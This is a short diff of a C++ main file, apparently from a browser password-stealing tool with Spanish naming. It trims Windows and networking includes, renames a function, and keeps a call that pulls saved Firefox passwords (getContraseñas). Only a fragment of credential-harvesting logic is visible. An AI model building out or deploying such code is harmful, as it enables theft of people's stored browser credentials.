@@ -1,29 +1,9 @@
-#include <windows.h>
-#include <Shlwapi.h>
-#include <Shlobj.h>
 #include <string>
-#include <cstdio>
-#include <Wincrypt.h>
-#include <fstream>
-#include <tlhelp32.h>
-#include <time.h>
-#include <wininet.h>
+#include <iostream>
+
 #include "Firefox.h"
 #include "chrome.h"
 #include "Recursos.h"
-#include <iostream>
-
-
-
-#pragma comment (lib, "shlwapi.lib")
-#pragma comment (lib, "crypt32.lib")
-#pragma comment (lib, "Shell32.lib")
-#pragma comment (lib, "wininet.lib")
-
-
-#include <windows.h>
-#include <Tlhelp32.h> 
-#include <stdio.h>
 
 using namespace std;
 
@@ -35,7 +15,7 @@ void main(){
 	Firefox firefox;
 	char *path = firefox.rutaInstalado();
 	char *info_firefox;
-	if (firefox.loadFunctions(path)){
+	if (firefox.cargarFunciones(path)){
 		//std::cout << "loadFunctions(path)" << endl;
 		info_firefox = firefox.getContraseñas();
 		free(path);
